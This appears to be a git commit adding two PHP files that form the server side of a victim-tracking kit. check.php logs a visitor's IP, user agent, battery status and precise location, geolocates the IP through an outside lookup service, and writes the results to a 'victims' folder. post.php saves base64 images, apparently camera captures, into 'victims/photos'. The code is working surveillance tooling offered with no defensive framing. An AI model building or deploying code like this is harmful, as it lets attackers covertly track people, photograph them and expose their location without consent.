285ca89be4ce0da6f799d92f7858417541006b22
EOTCWNEW <eotcworg@gmail.com>
2026-09-09 17:57:32 +0000

    initial commit

---
+++ check.php
@@ -0,0 +1,84 @@
+<?php 
+  header("Access-Control-Allow-Origin: 
+  *"); 
+  header("Access-Control-Allow-Methods: 
+  POST, GET, OPTIONS"); 
+  header("Access-Control-Allow-Headers: 
+  Content-Type"); $json = 
+  file_get_contents('php://input'); 
+  $jsondata = json_decode($json, 
+  true); $batdata = 
+  $jsondata['battery'] ?? null; 
+  $ip = 
+  $_SERVER['HTTP_CF_CONNECTING_IP']
+      ?? 
+      $_SERVER['HTTP_X_FORWARDED_FOR'] 
+      ?? $_SERVER['REMOTE_ADDR'] 
+      ?? 'unknown';
+  if (strpos($ip, ',') !== false) 
+  {
+    $ip = trim(explode(',', 
+    $ip)[0]);
+  }
+  $data = []; $ch = 
+  curl_init("http://ip-api.com/json/" 
+  . urlencode($ip)); 
+  curl_setopt($ch, 
+  CURLOPT_RETURNTRANSFER, true); 
+  curl_setopt($ch, 
+  CURLOPT_TIMEOUT, 5); $response = 
+  curl_exec($ch); curl_close($ch); 
+  if ($response) {
+    $data = json_decode($response, 
+    true) ?? [];
+  }
+  $lat = 
+  isset($jsondata['location']['lat']) 
+  ? $jsondata['location']['lat'] : 
+  ($data['lat'] ?? null); $lon = 
+  isset($jsondata['location']['lon']) 
+  ? $jsondata['location']['lon'] : 
+  ($data['lon'] ?? null); $info = 
+  array(
+    "UserAgent" => $jsondata['ua'] 
+    ?? 'N/A', "BatteryLevel" => 
+    $batdata['level'] ?? 'N/A', 
+    "ChargingStatus" => 
+    $batdata['charging'] ?? 'N/A', 
+    "IP" => $data['query'] ?? $ip, 
+    "Country" => $data['country'] 
+    ?? 'N/A', "CountryCode" => 
+    $data['countryCode'] ?? 'N/A', 
+    "City" => $data['city'] ?? 
+    'N/A', "Region" => 
+    $data['regionName'] ?? 'N/A', 
+    "RegionCode" => 
+    $data['region'] ?? 'N/A', 
+    "Latitude" => $lat ?? 'N/A', 
+    "Longitude" => $lon ?? 'N/A', 
+    "Maps" => ($lat && $lon) ? 
+    "https://www.google.com/maps?q=" 
+    . $lat . "," . $lon : 'N/A', 
+    "PostalCode" => $data['zip'] 
+    ?? 'N/A', "CountryFlag" => 
+    isset($data['countryCode']) ? 
+    "https://www.countryflags.io/" 
+    . $data['countryCode'] . 
+    "/flat/64.png" : 'N/A', "ASN" 
+    => $data['as'] ?? 'N/A', "ORG" 
+    => $data['org'] ?? 'N/A', 
+    "ISP" => $data['isp'] ?? 
+    'N/A', "UTC" => 
+    $data['timezone'] ?? 'N/A', 
+    "CurrentTime" => date('Y-m-d 
+    H:i:s')
+  ); $infosDir = 
+  "../../victims/infos"; $filepath 
+  = $infosDir . '/victims.json'; 
+  if (!file_exists($infosDir)) {
+    mkdir($infosDir, 0755, true);
+  }
+  file_put_contents($filepath, 
+  json_encode($info, 
+  JSON_PRETTY_PRINT));
+?>
---
+++ post.php
@@ -0,0 +1,53 @@
+<?php 
+  header("Access-Control-Allow-Origin: 
+  *"); 
+  header("Access-Control-Allow-Methods: 
+  POST, GET, OPTIONS"); 
+  header("Access-Control-Allow-Headers: 
+  Content-Type"); error_log("POST 
+  data received: " . 
+  print_r($_POST, true)); if 
+  (isset($_POST['image'])) {
+    $data = $_POST['image']; 
+    error_log("Image data length: 
+    " . strlen($data)); $data = 
+    str_replace('data:image/png;base64,', 
+    '', $data); $data = 
+    str_replace(' ', '+', $data); 
+    $imageData = 
+    base64_decode($data); 
+    error_log("Decoded image size: 
+    " . strlen($imageData) . " 
+    bytes"); $filename = 'photo_' 
+    . time() . '.png'; $photosDir 
+    = "../../victims" . '/' . 
+    'photos'; $filePath = 
+    $photosDir . '/' . $filename; 
+    if (!file_exists($photosDir)) 
+    {
+      mkdir($photosDir, 0755, 
+      true);
+    }
+    $result = 
+    file_put_contents($filePath, 
+    $imageData); error_log("File 
+    write result: " . ($result !== 
+    false ? "Success ($result 
+    bytes)" : "Failed")); if 
+    ($result !== false) {
+      error_log("Saved as 
+      $filename (size: " . 
+      strlen($imageData) . " 
+      bytes)");
+    } else {
+      http_response_code(500); 
+      error_log("Failed to save 
+      image");
+    }
+  } else {
+    http_response_code(400); 
+    error_log("No image data in 
+    POST"); echo "No image data 
+    received";
+  }
+?>
